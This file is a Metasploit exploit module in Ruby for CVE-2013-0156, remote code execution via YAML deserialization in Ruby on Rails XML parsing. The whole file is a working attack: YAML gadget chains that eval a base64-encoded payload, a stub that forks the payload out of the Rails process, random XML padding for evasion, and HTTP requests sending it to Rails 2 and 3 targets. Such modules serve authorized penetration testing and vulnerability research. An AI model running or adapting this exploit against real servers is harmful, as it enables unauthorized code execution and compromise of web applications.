# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStagerTFTP
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ruby on Rails XML Processor YAML Deserialization Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote code execution vulnerability in the XML request
        processor of the Ruby on Rails application framework. This vulnerability allows
        an attacker to instantiate a remote object, which in turn can be used to execute
        any ruby code remotely in the context of the application.

        This module has been tested across multiple versions of RoR 3.x and RoR 2.x

        The technique used by this module requires the target to be running a fairly version
        of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be
        exploitable using the init_with() method, but this has not been demonstrated.

      },
      &#039;Author&#039;         =>
        [
          &#039;charliesome&#039;,  # PoC
          &#039;espes&#039;,        # PoC and Metasploit module
          &#039;lian&#039;,         # Identified the RouteSet::NamedRouteCollection vector
          &#039;hdm&#039;           # Module merge/conversion/payload work
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2013-0156&#039;],
          [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156&#039;]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>  [ [&#039;Automatic&#039;, {} ] ],
      &#039;DisclosureDate&#039; => &#039;Jan 7 2013&#039;,
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;URIPATH&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, "/"]),
        OptString.new(&#039;HTTP_METHOD&#039;, [ true, &#039;The HTTP request method (GET, POST, PUT typically work)&#039;, "POST"])

      ], self.class)

    register_evasion_options(
      [
        OptBool.new(&#039;XML::PadElement&#039;, [ true, &#039;Pad the exploit request with randomly generated XML elements&#039;, true])
      ], self.class)
  end


  #
  # This stub ensures that the payload runs outside of the Rails process
  # Otherwise, the session can be killed on timeout
  #
  def detached_payload_stub(code)
  %Q^
    code = &#039;#{ Rex::Text.encode_base64(code) }&#039;.unpack("m0").first
    if RUBY_PLATFORM =~ /mswin|mingw|win32/
      inp = IO.popen("ruby", "wb") rescue nil
      if inp
        inp.write(code)
        inp.close
      end
    else
      if ! Process.fork()
        eval(code) rescue nil
      end
    end
  ^.strip.split(/\n/).map{|line| line.strip}.join("\n")
  end

  #
  # Create the YAML document that will be embedded into the XML
  #
  def build_yaml_rails2

    # Embed the payload with the detached stub
    code = Rex::Text.encode_base64( detached_payload_stub(payload.encoded) )
    yaml =
      "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n" +
      "&#039;#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
      "eval(%[#{code}].unpack(%[m0])[0]);&#039; " +
      ": !ruby/object:ActionController::Routing::Route\n segments: []\n requirements:\n   " +
      ":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\n     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: " +
      ":#{Rex::Text.rand_text_alpha(rand(8)+1)}\n"
    yaml
  end


  #
  # Create the YAML document that will be embedded into the XML
  #
  def build_yaml_rails3

    # Embed the payload with the detached stub
    code = Rex::Text.encode_base64( detached_payload_stub(payload.encoded) )
    yaml =
      "--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\n" +
      "&#039;#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
      "eval(%[#{code}].unpack(%[m0])[0]);&#039; " +
      ": !ruby/object:OpenStruct\n table:\n  :defaults: {}\n"
    yaml
  end


  #
  # Create the XML wrapper with any desired evasion
  #
  def build_request(v)
    xml = &#039;&#039;

    elo = Rex::Text.rand_text_alpha(rand(12)+4)

    if datastore[&#039;XML::PadElement&#039;]
      xml << "<#{elo}>"

      1.upto(rand(1000)+50) do
        el = Rex::Text.rand_text_alpha(rand(12)+4)
        tp = [&#039;string&#039;, &#039;integer&#039;][ rand(2) ]
        xml << "<#{el} type=&#039;#{tp}&#039;>"
        xml << ( tp == "integer" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )
        xml << "</#{el}>"
      end
    end

    el = Rex::Text.rand_text_alpha(rand(12)+4)
    xml << "<#{el} type=&#039;yaml&#039;>"
    xml << (v == 2 ? build_yaml_rails2 : build_yaml_rails3)
    xml << "</#{el}>"

    if datastore[&#039;XML::PadElement&#039;]
      1.upto(rand(1000)+50) do
        el = Rex::Text.rand_text_alpha(rand(12)+4)
        tp = [&#039;string&#039;, &#039;integer&#039;][ rand(2) ]
        xml << "<#{el} type=&#039;#{tp}&#039;>"
        xml << ( tp == "integer" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )
        xml << "</#{el}>"
      end

      xml << "</#{elo}>"
    end

    xml
  end

  #
  # Send the actual request
  #
  def exploit

    print_status("Sending Railsv3 request to #{rhost}:#{rport}...")
    res = send_request_cgi({
      &#039;uri&#039;     => datastore[&#039;URIPATH&#039;] || "/",
      &#039;method&#039;  => datastore[&#039;HTTP_METHOD&#039;],
      &#039;ctype&#039;   => &#039;application/xml&#039;,
      &#039;headers&#039; => { &#039;X-HTTP-Method-Override&#039; => &#039;get&#039; },
      &#039;data&#039;    => build_request(3)
    }, 25)
    handler

    print_status("Sending Railsv2 request to #{rhost}:#{rport}...")
    res = send_request_cgi({
      &#039;uri&#039;     => datastore[&#039;URIPATH&#039;] || "/",
      &#039;method&#039;  => datastore[&#039;HTTP_METHOD&#039;],
      &#039;ctype&#039;   => &#039;application/xml&#039;,
      &#039;headers&#039; => { &#039;X-HTTP-Method-Override&#039; => &#039;get&#039; },
      &#039;data&#039;    => build_request(2)
    }, 25)
    handler
  end
end

